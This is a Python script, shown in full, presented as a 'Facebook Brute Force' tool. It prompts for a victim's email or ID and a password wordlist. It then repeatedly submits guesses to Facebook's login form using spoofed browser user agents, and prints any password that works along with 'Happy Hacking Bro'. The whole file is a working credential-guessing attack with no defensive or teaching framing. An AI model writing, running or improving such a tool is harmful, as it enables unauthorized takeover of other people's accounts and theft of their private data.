#!/usr/bin/python
import mechanize
import random
import platform
import os
from time import sleep
from termcolor import colored
try:
    def Platform():
        sistema = platform.system().lower()
        if sistema =='linux' or sistema =='mac':
            return os.system('clear')
        elif sistema =='windows':
            return os.system('cls')
        else:
            return False
    Platform()
    random_agent = random.choice(['Mozilla/5.1 (Windows NT 10.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.104 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; ARM; Trident/7.1; Touch; rv:11.2; WPDesktop; Lumia 730 Dual SIM) like Gecko',
    'Mozilla/5.0 (Windows NT 10.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.0.1; SM-J500M Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/122.0.0.10.69;]',
    'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; Microsoft; RM-1068) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537',
    'Mozilla/5.0 (Linux; Android 5.0; Moto G (5) Build/NPPS25.137-33-6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/122.0.0.10.69;]',
    'Mozilla/5.0 (Linux; Android 4.4.4; SM-T116BU Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Safari/537.36 [FB_IAB/MESSENGER;FBAV/123.0.0.11.70;]',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 7_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/98.0.0.48.70;FBBV/62465497;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/VIVO;FBID/phone;FBLC/pt_BR;FBOP/5;FB',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 [FBAN/MessengerForiOS;FBAV/124.0.0.50.70;FBBV/63293619;FBDV/iPhone4,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.5;FBSS/2;FBCR/VIVO;FBID/phone;FBLC'])
    print("""
    __  __     __             
    \ \/ /_ __/ /_____ _______
     \  / // /  '_/ -_) __(_-<
     /_/\_,_/_/\_\\__/_/ /___/
    
    [] Facebook Brute Force []
    
    """)



    login = str(raw_input('Enter Email Or Id Your Victim -> '))
    Platform()
    print("[*] Your Target [*] ->" +login+'\n')
    wordlist = str(raw_input('Enter Your Wordlist -> '))
    try:
        f = open(wordlist,'r')
        ler = f.readlines()
    except IOError:
        print('Wordlist Tidak DiTemukan Mohon Masukkan Wordlist Yang Betul Bro')
    try:
        for attack in ler:
            conect = mechanize.Browser()
            conect.set_handle_robots(False)
            conect.open('https://facebook.com/')
            conect.addheaders=[('User-Agent',random_agent)]
            conect.select_form(nr=0)
            conect.form['email'] = login
            conect.form['pass'] = attack
            conect.submit()
            verifica = conect.title().lower()
            if verifica == 'facebook':
                print colored('\n[+] Ketemu Passwordnya [+]>'+attack)
                print colored('\nUsername: '+login+'\n'+'Password: '+attack)
                print colored('[*]\n Happy Hacking Bro [*]')
                raise SystemExit
            else:
                print colored('\n[-] Mencoba Password [-]>'+attack)
    except NameError:
        pass
except KeyboardInterrupt:
    print('\nAte mais!')
